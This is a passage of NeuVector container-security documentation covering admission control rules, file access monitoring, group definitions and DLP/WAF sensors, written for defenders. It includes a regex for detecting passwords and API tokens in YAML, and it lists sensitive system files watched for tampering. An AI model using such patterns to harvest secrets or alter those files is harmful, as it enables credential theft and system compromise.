tag (latest).  NeuVector uses this information to match the results in NeuVector Assets -&gt; Registry scan page and collects the corresponding information such as cve name, cve high or medium count etc. Image compliance violations are considered any image which has secrets or setuid/setgid violations. If users are using the image from docker registry to create a cluster resource, normally the registry server information is empty or docker.io and currently NeuVector is using the following hard-coded registry servers to match the registry scan result instead of empty or docker.io string. Of course, if there are more other than the following supported docker registry servers defined in the registry scan page, NeuVector is unable to get the registry scan results successfully.  If users are using the built-in image such as alpine or ubuntu from the docker registry, there is a hidden organization name called library. When you look at the results for docker build-in image in NeuVector Assets &gt; Registry scan page, the repository name will be library/alpine or library/ubuntu. Currently NeuVector assumes there is only one hidden library organization name in docker registry. If there is more than one, NeuVector is unable to get the registry scan results successfully as well. The above limitation could also apply on other type of docker registry servers if any.  Creating Custom Criteria Rules​  Users can create a customized criterion to be used to allow or block deployments based on common objects found in the image yaml (scanned upon deployment). Select the object to be used, for example imagePullSecrets and the matching value, for example exists. It is also recommended to use additional criteria to further target the rule, such as namespace, PSP/PSA, CVE conditions etc.    Criteria Explanations​  Criteria with a disk icon require that the image be scanned (see registry scanning), and criteria with a file icon will scan the deployment yaml. If both icons are listed, then matching will be for either (OR). If a criterion requires an image scan, but the image is NOT scanned, that part of the rule will be ignored (ie rule is bypassed, or if deployment yaml is also listed, then only the deployment yaml will be used to match). To prevent non-scanned images from bypassing rules, see the Image Scanned criterion below.   Add customized criterion. Select the object from the drop down. All custom criteria support exists and does not exist operators. For ones that allow values, additional operators and the value can be entered. Values can be static, separated by comma’s, and include wildcards. Allow Privilege Escalation. If the container allows privilege escalations, it can be blocked by setting Deny as the action. Count of High Severity CVE. This takes the results of an image (registry) scan and matches on the number of High severity (CVSS scores of 7 or higher). Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. Count of High Severity CVE with fix. This takes the results of an image (registry) scan and matches on High severity (CVSS scores of 7 or higher), AND if there is a fix available for the CVE. Select this if only planning to block deployments of high CVEs if a fix should have been applied. Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. Count of Medium Severity CVE. This takes the results of an image (registry) scan and matches on the number of Medium severity (CVSS scores of between 4 and 6). Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. CVE names. This matches on specific CVE names (e.g. CVE-2023-23914, 2023-23914, 23914, or unique text) where multiple are separated by comma’s. CVE score. Configure both the minimum score as well as the number of CVEs matching or exceeding the minimum CVSS score. Environment variables with secrets. If the deployment yaml or image scan result contains (or does not contain) any environment variables with secrets. See the criteria for secrets matching below. Environment variables. Use this to require or exclude certain environment variables in the deployment yaml or image scan. Image. Matching on specific image names, typically combined with other criteria for the rule. Image compliance violations. Matches if the image (registry) scan results in any compliance violations. See compliance for details on compliance checks. Image without OS information. Matches if the image (registry) scan results in the inability to retrieve OS information. Image registry. Matches on specific image registry names. Typically used to restrict deployments from certain registries or require deployments only from certain approved registries. Often used with other criteria such as namespaces. Image scanned. Require that an image be scanned. Often used to make sure all images are scanned to ensure that scan based criteria such as high CVEs can be applied to deployments. Image signed. Require that an image be signed through the integration of Sigstore/Cosign. This criteria simply checks whether there is any verifier in the scan result.Image Sigstore Verifiers. Require that an image be signed by a specific Sigstore root-of-trust name, as configured in Assets -&gt; Sigstore Verifiers. Checks whether the verifiers in the scan result match the verifiers in the rule configuration.Labels. Require that one or more labels be present in the deployment yaml or image scan results. Modules. Requires or excludes certain modules (packages, libraries) from being present in the image as the result of the image (registry) scan. Mount volumes. Typically used to prevent certain volumes from being mounted. Namespace. Allow or restrict deployments for certain namespace(s). Used independently but often combined with other criteria to limit the rule matching to namespace. PSP Best Practice. Equivalent rules for PSP (note: PSP is completely removed from kubernetes 1.25+, however this NeuVector equivalent may still used in 1.25+). Includes Run as privileged, Run as root, Share host's PID namespaces, Share host's IPC namespaces, Share host's Network, Allow Privilege Escalation. Resource Limit Configuration (RLC). Requires resource limits to be configured for CPU Limit/Request, Memory Limit/Request, and can require operator to be &gt; or &lt;= a configured resource value. Run as privileged. Typically used to limit or block deployments of privileged containers. Run as root. Typically used to limit or block deployments of containers run as root.. Service Account Bound High Risk Role. Can match on multiple criteria which could respresent a high risk service account role, including listing secrets, performing any operations on workloads, modification of RBAC resources, creation of workload resources, and allowing exec into a container. Share host’s IPC namespaces. Matches on IPC namespaces. Share host’s Network. Allow or disallow deployments to share the host’s network. Share host’s PID namespaces . Matches on PID namespaces. User. Allow or disallow defined users bound by kubernetes at run-time, visible in the userInfo field. Note: The yaml (upload) auditing function will not be able to check this because it is bound at run-time. User groups. Allow or disallow defined user groups bound by kubernetes at run-time, visible in the userInfo field. Note: The yaml (upload) auditing function will not be able to check this because it is bound at run-time. Violates PSA policy. Matches if the deployment violates either a Restricted or Baseline PSA Pod Security Standard (equivalent to PSA definitions in kubernetes 1.25+)   Secrets detection​  Detection of secrets, for example in environment variables is matched used the following regex:  Rule{Description: &quot;Password.in.YML&quot;, Expression: `(?i)(password|passwd|api_token)\\S{0,32}\\s*:\\s*(?-i)([0-9a-zA-Z\\/+]{16,40}\\b)`, ExprFName: `.*\\.ya?ml`, Tags: []string{share.SecretProgram, &quot;yaml&quot;, &quot;yml&quot;}, Suggestion: msgReferVender},   A list of types of secrets detected can be found here   ","version":"5.3","tagName":"h3"},{"title":"Admission Control Modes​","type":1,"pageTitle":"Admission Controls","url":"/policy/admission#admission-control-modes","content":" There are two modes NeuVector supports - Monitor and Protect.  Monitor: there is an alert message in the event log if a decision is denied. In this case, the cluster apiserver is allowed to create a resource successfully. Note: even if the rule action is Deny, in Monitor mode this will only alert.Protect: this is an inline protection mode. Once a decision is denied, the cluster resource will not be able to be created successfully, and an event will be logged.  ","version":"5.3","tagName":"h3"},{"title":"Admission Control Rules​","type":1,"pageTitle":"Admission Controls","url":"/policy/admission#admission-control-rules","content":" Rules can be Allow (whitelist) or Deny (blacklist) rules. Rules are evaluated in the order displayed, from top to bottom. Allow rules are evaluated first, and are useful to define exceptions (subsets) to Deny rules. If a resource deployment does not match any rules, the default action is to Allow the deployment.  There are two pre-configured rules which should be allowed to enable Kubernetes system container and NeuVector deployments.  Admission control rules apply to all resources which create pods (e.g. deployments, daemonsets, replicasets etc).  For admission control rules, the matching order is:  Default allow rules (e.g. system namespaces)Federated allow rules (if these exist)Federated deny rules (if these exist)CRD applied allow rules (if these exist)CRD applied deny rules (if these exist)User-defined allow rulesUser-defined deny rulesAllow the request if the request doesn't match any rule's criteria above  In each of the matching stages(1~7), the rule order doesn't matter. As long as the request matches one rule's criteria, the action (allow or deny) is taken and the request is allowed or denied.  ","version":"5.3","tagName":"h3"},{"title":"Federated Scan Results in Admission Control Rules​","type":1,"pageTitle":"Admission Controls","url":"/policy/admission#federated-scan-results-in-admission-control-rules","content":" The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster. Registries only need to be scanned once instead of by each cluster, reducing CPU/memory and network bandwidth usage. See the multi-cluster section for more details.  ","version":"5.3","tagName":"h3"},{"title":"Configuring Sigstore/Cosign Verifiers for Requiring Image Signing​","type":1,"pageTitle":"Admission Controls","url":"/policy/admission#configuring-sigstorecosign-verifiers-for-requiring-image-signing","content":" Please see this section for configuring verifiers.  ","version":"5.3","tagName":"h3"},{"title":"Troubleshooting​","type":1,"pageTitle":"Admission Controls","url":"/policy/admission#troubleshooting","content":" If experiencing errors and you have access to the master node you can inspect the kube-apiserver log to search for admission webhook events. Examples:  W0406 13:16:49.012234 1 admission.go:236] Failed calling webhook, failing open neuvector- validating-admission-webhook.neuvector.svc: failed calling admission webhook &quot;neuvector-validating- admission-webhook.neuvector.svc&quot;: Post https://neuvector-svc-admission- webhook.neuvector.svc:443/v1/validate/1554514310852084622-1554514310852085078?timeout=30s: dial tcp: lookup neuvector-svc-admission-webhook.neuvector.svc on 8.8.8.8:53: no such host   The above log indicates that the cluster kube-apiserver is unable to send the request to the NeuVector webhook successfully because it fails to resolve the neuvector-svc-admission-webhook.neuvector.svc name.  W0405 23:43:01.901346 1 admission.go:236] Failed calling webhook, failing open neuvector- validating-admission-webhook.neuvector.svc: failed calling admission webhook &quot;neuvector-validating- admission-webhook.neuvector.svc&quot;: Post https://neuvector-svc-admission-webhook.neuvector.svc:443/v1/validate/1554500399933067744-1554500399933068005?timeout=30s: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)   The above log indicates that the cluster kube-apiserver is unable to send the request to the NeuVector webhook successfully because it resolves the neuvector-svc-admission-webhook.neuvector.svc name with the wrong IP address. It could also indicate a network connectivity or firewall issue between api-server and the controller nodes.  W0406 01:14:48.200513 1 admission.go:236] Failed calling webhook, failing open neuvector- validating-admission-webhook.xyz.svc: failed calling admission webhook &quot;neuvector-validating- admission-webhook.xyz.svc&quot;: Post https://neuvector-svc-admission- webhook.xyz.svc:443/v1/validate/1554500399933067744-1554500399933068005?timeout=30s: x509: certificate is valid for neuvector-svc-admission-webhook.neuvector.svc, not neuvector-svc-admission- webhook.xyz.svc   The above log indicates that the cluster kube-apiserver can send the request to the NeuVector webhook successfully but the certificate in caBundle is wrong.  W0404 23:27:15.270619 1 admission.go:236] Failed calling webhook, failing open neuvector- validating-admission-webhook.neuvector.svc: failed calling admission webhook &quot;neuvector-validating- admission-webhook.neuvector.svc&quot;: Post https://neuvector-svc-admission- webhook.neuvector.svc:443/v1/validate/1554384671766437200-1554384671766437404?timeout=30s: service &quot;neuvector-svc-admission-webhook&quot; not found   The above log indicates that the cluster kube-apiserver is unable to send the request to the NeuVector webhook successfully because the neuvector-svc-admission-webhook service is not found.  Review Admission Control Configurations​  First, check your Kubernetes or OpenShift version. Admission control is supported in Kubernetes 1.9+ and OpenShift 3.9+. For OpenShift, make sure you have edited the master-config.yaml to add the MutatingAdmissionWebhook configuration and restarted the master api-servers.  Check the Clusterrole  kubectl get clusterrole neuvector-binding-admission -o json   Make sure the verbs include:   &quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;update&quot;, &quot;delete&quot;   Then check:  kubectl get clusterrole neuvector-binding-app -o json   Make sure the verbs include:   &quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;update&quot;   If the above verbs are not listed, the Test button will fail.  Check the Clusterrolebinding  kubectl get clusterrolebinding neuvector-binding-admission -o json   Make sure the ServiceAccount is set properly:  &quot;subjects&quot;: [ { &quot;kind&quot;: &quot;ServiceAccount&quot;, &quot;name&quot;: &quot;default&quot;, &quot;namespace&quot;: &quot;neuvector&quot;   Check the Webhook Configuration  kubectl get ValidatingWebhookConfiguration --as system:serviceaccount:neuvector:default -o yaml &gt; nv_validation.txt   The nv_validation.txt should have similar content to:  apiVersion: v1 items: - apiVersion: admissionregistration.k8s.io/v1beta1 kind: ValidatingWebhookConfiguration metadata: creationTimestamp: &quot;2019-09-11T00:51:08Z&quot; generation: 1 name: neuvector-validating-admission-webhook resourceVersion: &quot;6859045&quot; selfLink: /apis/admissionregistration.k8s.io/v1beta1/validatingwebhookconfigurations/neuvector-validating-admission-webhook uid: 3e1793ed-d42e-11e9-ba43-000c290f9e12 webhooks: - admissionReviewVersions: - v1beta1 clientConfig: caBundle: {.........................} service: name: neuvector-svc-admission-webhook namespace: neuvector path: /v1/validate/{.........................} failurePolicy: Ignore name: neuvector-validating-admission-webhook.neuvector.svc namespaceSelector: {} rules: - apiGroups: - '*' apiVersions: - v1 - v1beta1 operations: - CREATE resources: - cronjobs - daemonsets - deployments - jobs - pods - replicasets - replicationcontrollers - services - statefulsets scope: '*' - apiGroups: - '*' apiVersions: - v1 - v1beta1 operations: - UPDATE resources: - daemonsets - deployments - replicationcontrollers - statefulsets - services scope: '*' - apiGroups: - '*' apiVersions: - v1 - v1beta1 operations: - DELETE resources: - daemonsets - deployments - services - statefulsets scope: '*' sideEffects: Unknown timeoutSeconds: 30 kind: List metadata: resourceVersion: &quot;&quot; selfLink: &quot;&quot;   If you see any content like &quot;Error from server ....&quot; or &quot;... is forbidden&quot;, it means the NV controller service account doesn't have access right for ValidatingWebhookConfiguration resource. In this case it usually means the neuvector-binding-admission clusterrole/clusterrolebinding has some issue. Deleting and recreating neuvector-binding-admission clusterrole/clusterrolebinding usually the fastest fix.  Test the Admission Control Connection Button  In the NeuVector Console in Policy -&gt; Admission Control, go to More Operations -&gt; Advanced Setting and click the &quot;Test&quot; button. NeuVector will modify service neuvector-svc-admission-webhook and see if our webhook server can receive the change notifification or if it fails.  Run  kubectl get svc neuvector-svc-admission-webhook -n neuvector -o yaml   The output should look like:  apiVersion: v1 kind: Service metadata: annotations: ................... creationTimestamp: &quot;2019-09-10T22:53:03Z&quot; labels: echo-neuvector-svc-admission-webhook: &quot;1568163072&quot; //===&gt; from last test. could be missing if it's a fresh NV deployment tag-neuvector-svc-admission-webhook: &quot;1568163072&quot; //===&gt; from last test. could be missing if it's a fresh NV deployment name: neuvector-svc-admission-webhook namespace: neuvector ................... spec: clusterIP: 10.107.143.177 ports: - name: admission-webhook port: 443 protocol: TCP targetPort: 20443 selector: app: neuvector-controller-pod sessionAffinity: None type: ClusterIP status: loadBalancer: {}   Now click admission control's advanced setting =&gt; &quot;Test&quot; button. Wait until it shows success or failure. NeuVector will modify the service neuvector-svc-admission-webhook's tag-neuvector-svc-admission-webhook label implicitly. Wait for controller internal operation. If the NeuVector webhook server receives update request from kube-apiserver about this service change, NeuVector will modify the service neuvector-svc-admission-webhook's echo-neuvector-svc-admission-webhook label to the same value as tag-neuvector-svc-admission-webhook label. Run  kubectl get svc neuvector-svc-admission-webhook -n neuvector -o yaml   The output should look like   apiVersion: v1 kind: Service metadata: annotations: ............. creationTimestamp: &quot;2019-09-10T22:53:03Z&quot; labels: echo-neuvector-svc-admission-webhook: &quot;1568225712&quot; //===&gt; changed in step 3-3 after receiving request from kube-apiserver tag-neuvector-svc-admission-webhook: &quot;1568225712&quot; //===&gt; changed in step 3-2 because of UI operation name: neuvector-svc-admission-webhook namespace: neuvector ................. spec: clusterIP: 10.107.143.177 ports: - name: admission-webhook port: 443 protocol: TCP targetPort: 20443 selector: app: neuvector-controller-pod sessionAffinity: None type: ClusterIP status: loadBalancer: {}   After the test, if the value of label tag-neuvector-svc-admission-webhook doesn't change, it means the controller service fails to update neuvector-svc-admission-webhook service. Check if neuvector-binding-app clusterrole/clusterrolebinding are configured correctly. After the test, if the value of label tag-neuvector-svc-admission-webhook is changed but not the value of label echo-neuvector-svc-admission-webhook, it means the webhook server didn't receive the request from the kube-apiserver. The kub-apiserver's request can't reach the NeuVector webhook server. The cause of this could be network connectivity issues, firewalls blocking the request (on default port 443 in), the resolving of the wrong IP for the controller or others. ","version":"5.3","tagName":"h3"},{"title":"File Access Rules","type":0,"sectionRef":"#","url":"/policy/filerules","content":"","keywords":"","version":"5.3"},{"title":"Policy: File Access Rules​","type":1,"pageTitle":"File Access Rules","url":"/policy/filerules#policy-file-access-rules","content":" There are two types of Process/File protections in NeuVector. One is Zero-drift, where allowed process and file activity are automatically determined based on the container image, and second is a behavioral learning based. Each can be customized (rules added manually) if desired.  NeuVector has built-in detection of suspicious file system activity. Sensitive files in containers normally do not change at run-time. By modifying the content of the sensitive files, an attacker can gain unauthorized privileges, such as in the Dirty-Cow linux kernel attack, or damage the system’s integrity, for example by manipulating the /etc/hosts file. Most containers don't run in read-only mode. Any suspicious activity in containers, hosts, or the NeuVector Enforcer container itself will be detected and logged into Notifications -&gt; Security Events.  Zero-drift File Protection​  This is the default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require file activity to be added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.  note The process/file rules listed for each group are always applied, even when zero-drift is enabled. This offers a way to add allow/deny exceptions to the base zero-drift protections. Keep in mind that if a group starts in Discover mode, process/file rules can be automatically added to the list, and should be reviewed and edited before moving to Monitor/Protect modes.  The ability to enable/disable zero-drift mode is in the console in Policy -&gt; Groups. Multiple groups can be selected to toggle this setting for all selected groups.  Basic File Protections​  If a package installation is detected, an automatic re-scan of the container or host will be triggered to detect any vulnerabilities, IF auto-scan has been enabled in Security Risks -&gt; Vulnerabilities.  In addition to monitoring predefined files/directories, users can add custom files/directories to be monitored, and block such files/directories from being modified.  important NeuVector alerts, and does not block modifications to predefined files/directories or in system containers such as Kubernetes ones. Blocking is only an option for user configured custom files/directories for non-system containers. This is so that regular updates of system folder or sensitive configurations are not blocked unintentionally, resulting in erratic system behavior.  The following files and directories are monitored by default:  Executable filesSensitive setuid/setgid filesSystem libraries, libc, pthread, ...Package installation, Debian/Ubuntu, RedHat/CentOS, AlpineSensitive system files, /etc/passwd, /etc/hosts, /etc/resolv.conf …Running processes' executable files  The following activities are monitored:  Files, directories, symlinks (hard link and soft link)created, deleted, modified (content change) and moved  Below is a list of the file system monitoring and what is monitored (container, host/node, and/or NeuVector enforcer container itself):  /bin, /usr/bin, /usr/sbin, /usr/local/bin - container, enforcerFiles of setuid and setgid attribute - container, host, enforcerLibraries: libc, pthread, ld-linux.* - container, host, enforcerPackage installation: dpkg, rpm, apk - container, host, enforcer/etc/hosts, /etc/passwd, /etc/resolv.conf - container, host, enforcerBinaries of the running processes - container  Behavioral-learning based Allowed Applications in Discover Mode​  When in Discover mode, NeuVector can learn and whitelist applications ONLY for specified directories or files. To enable learning, a custom rule must be created and the Action must be set to Block, as described below.  Creating Custom File/Directory Monitoring Rules​  Custom file access rules can be created for both custom user-defined Groups as well as auto-learned Groups.  Users can add new entries for file/directory rules.  Filter: Configure the file/folder to be protected (wildcards are supported)Set the recursive flag (if all files in the subdirectories are to be protected)Select the action, Monitor or Block (see Actions below)Enter allowed applications (see Note1 below)    Actions:  Monitor file changes. Generate alerts (Notifications) for any changesBlock unauthorized access. Service in Discover mode: the file access behavior is learned (the processes/applications that access the protected file) and added to the Allowed Applications.Service in Monitor mode: unexpected file behavior is alerted.Service in Protect mode: unexpected access (read, modify) is blocked. New file creation in protected folders will be blocked as well.  note If the rule is set to Block, and the service is in Discover mode, NeuVector will learn the applications accessing the file and add these to the Allowed Applications for the rule.  note Container platforms running the AUFS storage driver will not support the deny (block) action in Protect mode for creating/modifying files due to the limitations of the driver. The behavior will be the same a Monitor mode, alerting upon suspicious activity.  File access rule order precedence​  A container can inherit file access rule from multiple custom groups and user created file access rule on auto learned group.  File access rules are prioritized in the order below if the file name conflicts with predefined access rules of auto learned group and rules inheritance of multiple groups.  File access rule with block access (highest order)File access rule with recursive enabledFile access rule with recursive disableUser created file access rule other than predefined file access rules  Examples​  Showing file access rule to protect /etc/hostname file of node-pod service and allow vi application to modify the file.    Showing file access rule to protect files under /var/opt/ directory recursively for modification as well reading. The Allowed Application python can have read and modify access to these files.    Showing access rule that protects file /etc/passwd, which is one of the files covered predefined access rule in order to modify the file access action, for modification as well reading. This custom rule changes the default action of the predefined file access rule. The application Nano can have 'read and modify' access to these files. Must also add the Nano application (process) as an 'allow' rule in the process profile rule for this service to run Nano application inside the service (if it wasn't already whitelisted there), otherwise the process will be blocked by NeuVector.    Showing that the application python was learned accessing file under /var/opt directory when service mode of node-pod was in Discover. This occurs only when the rule is set to Block and the service is in Discover mode.    Showing predefined file access rules for the service node-pod.demo-nvqa. This can be viewed for this service by clicking the info icon “show predefined filters” in the right corner of the file access rule tab.    Showing a sample security event in Notifications -&gt; Security Events, alerted as File access denial when modification of the file /etc/hostname by the application python was denied due to a custom file access rule with block action.    Other Responses​  If other special mitigations, responses, or alerts are desired for File System Violations, a Response Rule can be created. See the example below and the section Run-Time Security Policy -&gt; Response Rules for more details.    ","version":"5.3","tagName":"h3"},{"title":"Split Mode File Protections​","type":1,"pageTitle":"File Access Rules","url":"/policy/filerules#split-mode-file-protections","content":" Container Groups can have Process/File rules in a different mode than Network rules, as described here. ","version":"5.3","tagName":"h3"},{"title":"Groups","type":0,"sectionRef":"#","url":"/policy/groups","content":"","keywords":"","version":"5.3"},{"title":"Policy: Groups​","type":1,"pageTitle":"Groups","url":"/policy/groups#policy-groups","content":" This menu is the key area to view and manage security rules and customize Groups for use in rules. It is also used to switch modes of Groups between Discover, Monitor, and Protect. Container Groups can have Process/File rules in a different mode than Network rules, as described here. Please see the following individual sections for explanations of Custom Compliance Checks, Network Rules, Process and File Access Rules and DLP/WAF detection. Note: Network rules can be viewed in the Groups menu for any group, but must be edited separately in the Network Rules menu.  NeuVector automatically creates Groups from your running applications. These groups start with the prefix 'nv.' You can also manually add them using a CRD or the REST API and can be created in any mode, Discover, Monitor, or Protect. Network and Response Rules require these Group definitions. For automatically created Groups ('learned' groups starting with 'nv'), NeuVector will learn the network and process rules and add them while in Discover mode. Custom Groups will not auto-learn and populate rules. Note: 'nv.' groups start with zero drift enabled by default for process/file protections.    It is convenient to see groups of containers and apply rules to each group. NeuVector creates a list of groups based on the container images. For example, all containers started from one Wordpress image will be in the same group. Rules are automatically created and applied to the group of containers.  The Groups screen also displays a 'Scorable' icon in the upper right, and a learned group can be selected and the Scorable checkbox enabled or disabled. This controls which containers are used to calculate the Security Risk Score in the Dashboard. See Improve Security Risk Score for more details.  The Groups screen is also where the CRD yaml file for 'security policy as code' can be imported and exported. Select one or more groups and click on the Export Group policy button to download the yaml file. See the CRD section for more details on how to use CRDs. Important: Each selected group AND any linked groups through network rules will be exported (i.e. the group and any other group it connects to through the whitelist network rules).  Auto Deletion of Unused Groups​  Learned groups (not reserved or custom groups) can be automatically deleted by NeuVector if there are no members (containers) in the group. The time period for this is configurable in Settings -&gt; Configuration.  Host Protection - the 'Nodes' Group​  NeuVector automatically creates a group called 'nodes' which represents each node (host) in the cluster. NeuVector provides automated basic monitoring of hosts for suspicious processes (such as port scans, reverse shells etc.) and privilege escalations. In addition, NeuVector will learn the process behavior of each node while it is in Discover mode to whitelist those processes, similar to how it is done with container processes. The 'local' (learned) process rule list is a combination of all processes from all nodes in the cluster while in Discover mode.  The nodes can then be put into the Monitor or Protect mode, where NeuVector will alert is any process starts while in Monitor mode, and block that process in Protect mode.    To enable host protection with process profile rules, select the 'nodes' group and review the learned processes on the node. Customize if needed by adding, deleting or editing process rules. Then switch the mode to Monitor or Protect.  note Network connection violations of rules shown in the Network Rules for Nodes are never blocked, even in Protect mode. Only process violations are blocked in Protect mode on nodes.  Custom Groups​  Groups can be manually added by entering the criteria for the group. Note: Custom created groups don't have a Protection mode. This is because they may contain containers from different underlying groups, each of which may be in a different mode, causing confusion about the behavior.  Groups can be created by:  Images  Select containers by their image names. Examples: image=wordpress, image@redis  Nodes  Select containers by nodes on which they are running. Examples: node=ip-12-34-56-78.us-west-2  Individual containers  Select containers by their instance names. Examples: container=nodejs_1, container@nodejs  Services  Select containers by their services. If a container is deployed by Docker Compose, its service tag value will be &quot;project_name:service_name&quot;; if a container is deployed by Docker swarm mode service, its service tag value will be the swarm service name.  Labels  Select containers by their labels. Examples: com.docker.compose.project=wordpress, location@us-west  Addresses  Create a group by DNS name or IP address ranges. Examples: address=www.google.com, address=10.1.0.1, address=10.1.0.0/24, address=10.1.0.1-10.1.0.25. DNS name can be any name resolvable. Address criteria do not accept the != operator. See below for special virtual host 'vh' address groups.  A group can be created with mixed criteria types, except the 'address' type, which cannot be used together with other criteria. Mixed criteria enforces an ‘AND’ operation between the criteria, for example label service_type=data AND image=mysql. Multiple entries for one or criteria are treated as OR, for example address=google.com OR address=yahoo.com. Note: To assist in analyzing ingress/egress connections, a list of ingress and egress IPs can be downloaded from the Dashboard -&gt; Ingress/Egress details section as an Exposure Report.  Partial matching is supported for image, node, container, service and label criteria. For example, image@redis, selects containers whose image name contains 'redis' substring; image^redis, selects containers whose image name starts with 'redis'.  It is not recommended to use address criteria to match internal IPs or subnets, especially those protected by enforcers, instead, using their meta data, such as image, service or labels, is recommended. The typical use cases for address group are to define policies between managed containers and external IP subnets, for example, services running on Internet or another data center. Address group does not have group members.  Wildcards '' can be used in criteria, for example 'address=.google.com'. For more flexible matching, use the tilde '' to indicate a regex match is desired. For example to match labels 'policypublic.*-ext1' for the label policy.  note Special characters used after an equals '=' in criteria may not match properly. For example the dot '.' In 'policy=public.' will not match properly, and regex match should be used instead, like 'policy~public.'  After saving a new group, NeuVector will display the members in that group. Rules can then be created using these groups.  Virtual Host ('vh') Based Network Policy​  Custom groups can support virtual host based address groups. This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.  ","version":"5.3","tagName":"h3"},{"title":"Custom Group Examples​","type":1,"pageTitle":"Groups","url":"/policy/groups#custom-group-examples","content":" General Criteria​  To select all containers (either example below will work)  container=∗ service=∗  To select all containers in the namespace 'default' (namespace supported from v2.2)  namespace=default  To select all containers whose service name starts with 'nginx'  service=nginx∗  To select all containers whose service name contains 'etcd'  service=∗etcd∗  To select all containers in the namespace 'apache1' or 'apache2' (hit enter after each entry)  namespace=apache1 namespace=apache2  To select all containers NOT in the namespace 'apache1' and 'apache2' (hit enter after each entry)  namespace!=apache1 namespace!=apache2  To select all containers in the namespace 'apache1~9'  namespace~apache[1-9]  IP Address Criteria​  All external IP addresses  Please use the default group ‘external’ in rules  IP subnet 10.0.0.0/8  address=10.0.0.0/8  IP range  address=10.0.0.0-10.0.0.15  dropbox.com and it's subdomains (hit enter after each entry)  address=dropbox.com address=*.dropbox.com ","version":"5.3","tagName":"h3"},{"title":"DLP & WAF Sensors","type":0,"sectionRef":"#","url":"/policy/dlp","content":"","keywords":"","version":"5.3"},{"title":"Data Loss Prevention (DLP) and Web Application Firewall (WAF)​","type":1,"pageTitle":"DLP & WAF Sensors","url":"/policy/dlp#data-loss-prevention-dlp-and-web-application-firewall-waf","content":" DLP and WAF uses the Deep Packet Inspection (DPI) of NeuVector to inspect the network payloads of connections for sensitive data violations. NeuVector uses a regular expression (regex) based engine to perform packet filtering functions. Extreme care should be taken when applying sensors to container traffic, as the filtering function incurs additional system overhead and can impact performance of the host.  DLP and WAF filtering are applied differently depending on the group(s) to which they are applied. In general, WAF filtering is applied to inbound and outbound connections except for internal traffic where only inbound filtering is applied. DLP filtering applies to inbound and outbound connections from a 'security domain', but not any internal connections within a security domain. See the detailed descriptions below.  Configuring DLP or WAF is a two step process:  Define and test the sensor(s), which is the set of regular expressions used to match the header, URL, or entire packet.Apply the desired sensor to a Group, in the Policy -&gt; Groups screen.  WAF Sensors​  WAF sensors represent inspection of network traffic to/from a pod/container. These sensors can be applied to any applicable group, even custom groups (e.g. namespace groups). Incoming traffic to ALL containers within the group will be inspected for WAF rule detection. In addition, any outbound (egress) connections external to the cluster will be inspected.  This means that, while this feature is named WAF, it is useful and applicable to any network traffic, not only web application traffic, and therefore provides broader protections than simple WAFs. For example, API security can be enforced on outbound connections to an external api service, allowing only GET requests and blocking POSTs.  Also note that, while similar to DLP, the inspection is for incoming traffic to EVERY pod/container within the group, while DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group's containers).    DLP Sensors​  DLP Sensors are the patterns that are used to inspect traffic. Built in sensors such as credit card and U.S. social security have predefined regular expressions. You can add custom sensors by defining regex patterns to be used in that sensor. Note that, while similar to WAF, DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group's containers). WAF inspection is for incoming traffic only to EVERY pod/container within the group.    Configuring DLP and WAF sensors​  The configuration of DLP and WAF sensors is similar. Create a sensor Name and any comment, then select the sensor to Add or Edit the rules for that sensor. Key fields include:  Have/Not Have. Determines if the match requires the pattern to be found (Have) in order to take the action (e.g. Deny), or only if the pattern does not exist (Not Have) should the action be taken. It is recommended that the &quot;Not Have&quot; operator be combined in the rule with a pattern using the &quot;Have&quot; operator because a single pattern with &quot;Not Have&quot; operator will not be effective.Pattern. This is the regular expression used to determine a match. You can test your regex against sample data to ensure correct Have/Not Have results.Context. Where to look for the pattern match. Choose packet for the broadest inspection of the entire network connection, or narrow the inspection to the URL, header, or body only.    Each DLP/WAF rule supports multiple patterns (max 16 patterns are allowed per rule). Multiple patterns as well as setting the rule context can also help reduce false positives.  Example of a DLP rule with a Have/Not Have pattern: Have:  \\b3[47]\\d{2}([ -]?)(?!(\\d)\\2{5}|123456|234567|345678)\\d{6}\\1(?!(\\d)\\3{4}|12345|56789)\\d{5}\\b   This produces a false positive match for &quot;istio_agent_go_gc_duration_seconds_sum 22.378386247999998&quot;:  docker exec -ti httpclient sh / # curl -d &quot;{\\&quot;context\\&quot;: \\&quot;istio_agent_go_gc_duration_seconds_sum 22.378386247999998\\&quot;}&quot; 172.17.0.5:8080/ Hello, world!   Adding a Not Have pattern removes the false positive:  istio\\_(\\w){5}   Sensors must be applied to a Group to become effective.  Applying DLP/WAF Sensors to Container Groups​  To activate a DLP or WAF sensor, go to Policy -&gt; Groups to select the group desired. Enable DLP/WAF for the Group and add the sensor(s).  It is recommended that DLP sensors be applied to the boundary of a security zone, defined by a Group, to minimize the impact of DLP inspection. If needed, define a Custom Group that represents such a security zone. For example, if the Group selected is the reserved group 'containers', and DLP sensors added to the group, only traffic in or out of the cluster and not between all containers will be inspected. Or if it is a custom group defined as 'namespace=demo' then only traffic in or out of the namespace demo will be inspected, and not any inter-container traffic within the namespace.  It is recommended that WAF sensors be applied only to Groups where incoming (e.g. ingress) connections are expected, unless the sensor(s) apply to specific internal applications (expecting east-west traffic).    DLP/WAF Behavior Summary  DLP pattern 